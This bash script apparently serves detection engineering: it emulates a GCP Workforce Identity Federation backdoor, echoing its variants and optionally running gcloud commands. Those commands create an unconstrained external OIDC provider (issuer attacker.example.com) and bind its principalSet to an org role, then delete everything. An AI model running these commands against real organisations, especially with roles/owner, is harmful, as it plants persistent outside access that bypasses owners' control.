#!/usr/bin/env bash
# TRR9020 (T1199) behavioral emulation: Workforce Identity Federation backdoor in GCP --
# trust an external IdP for ORG-scoped human identities and bind a workforce principalSet
# directly to a privileged project/folder/org role.
#
#   * DOCUMENT/LIVE: with TRR9020_LIVE=1 and gcloud authenticated at org scope, creates a
#     THROWAWAY workforce pool + OIDC provider (no attribute condition) and binds its
#     principalSet to a role, then deletes them. Your own org/project. NOT run in CI.
#   * FIXTURE: --show-fixture prints the committed Cloud Audit Log fixtures the CI validator
#     runs the detections over.
#
# Rules:
#   detections/sigma/T1199/gcp_workforce_pool_provider_no_attribute_condition.yml   (A/B provider)
#   detections/sigma/T1199/gcp_workforce_principalset_privileged_binding.yml        (A/C binding)
set -euo pipefail

PROC="${1:-c}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXDIR="$HERE/../../../detections/cloud/fixtures/trr9020"

if [[ "${1:-}" == "--show-fixture" || "${2:-}" == "--show-fixture" ]]; then
  cat "$FIXDIR/attack.json"; exit 0
fi

ORG="${TRR9020_ORG:-123456789012}"
POOL="${TRR9020_POOL:-trr9020-ext-pool}"
PROVIDER="${TRR9020_PROVIDER:-attacker-idp}"
ISSUER="${TRR9020_ISSUER:-https://attacker.example.com}"
ROLE="${TRR9020_ROLE:-roles/viewer}"   # LIVE default is a SAFE role; the attack uses roles/owner

echo "== TRR9020.GCP.$PROC — Workforce Identity Federation backdoor =="
case "$PROC" in
  a) echo "A: full backdoor -- create workforce pool + external provider (no attributeCondition),"
     echo "   then bind principalSet://.../workforcePools/<pool>/* to a privileged role." ;;
  b) echo "B: loosen an existing provider -- UpdateWorkforcePoolProvider (blank the attributeCondition)." ;;
  c) echo "C: bind a workforce principalSet directly to a privileged project/folder/org role"
     echo "   (cloudresourcemanager SetIamPolicy; no SA / workloadIdentityUser step)." ;;
  d) echo "D: use -- workforce sign-in + STS token exchange. GAP: Data Access / Admin-Read, OFF BY DEFAULT." ;;
  *) echo "usage: emulate_gcp_workforce.sh {a|b|c|d} [--live|--show-fixture]"; exit 1 ;;
esac
echo
echo "The member + role that define the chokepoint:"
echo "  principalSet://iam.googleapis.com/locations/global/workforcePools/${POOL}/*"
echo "  attack role: roles/owner   provider attributeCondition: (empty)   issuer: ${ISSUER}"

if [[ "${TRR9020_LIVE:-0}" == "1" || "${2:-}" == "--live" ]]; then
  command -v gcloud >/dev/null || { echo "gcloud not found"; exit 1; }
  echo
  echo "[live] creating throwaway workforce pool '$POOL' and OIDC provider '$PROVIDER' (org $ORG)..."
  gcloud iam workforce-pools create "$POOL" --organization="$ORG" --location=global \
    --display-name="trr9020 ext pool" >/dev/null
  gcloud iam workforce-pools providers create-oidc "$PROVIDER" --organization="$ORG" \
    --location=global --workforce-pool="$POOL" --issuer-uri="$ISSUER" \
    --attribute-mapping="google.subject=assertion.sub" \
    --web-sso-response-type=code --web-sso-assertion-claims-behavior=merge-user-info-over-id-token-claims >/dev/null
  echo "[live] binding the pool principalSet to $ROLE on org $ORG (SAFE role by default)..."
  gcloud organizations add-iam-policy-binding "$ORG" --role="$ROLE" \
    --member="principalSet://iam.googleapis.com/locations/global/workforcePools/${POOL}/*" >/dev/null
  echo "[live] review the ORGANISATION's Admin Activity log for SetIamPolicy + CreateWorkforcePoolProvider. Cleaning up..."
  gcloud organizations remove-iam-policy-binding "$ORG" --role="$ROLE" \
    --member="principalSet://iam.googleapis.com/locations/global/workforcePools/${POOL}/*" >/dev/null || true
  gcloud iam workforce-pools providers delete "$PROVIDER" --organization="$ORG" --location=global \
    --workforce-pool="$POOL" --quiet >/dev/null || true
  gcloud iam workforce-pools delete "$POOL" --organization="$ORG" --location=global --quiet >/dev/null || true
  echo "[live] done. NOTE: workforce pools are org-scoped -- use an org-level log sink to see Leg 1."
else
  echo
  echo "(dry) set TRR9020_LIVE=1 with gcloud authenticated at org scope to run the throwaway"
  echo "      pool/provider/binding create+delete, or pass --show-fixture for the recorded telemetry."
fi
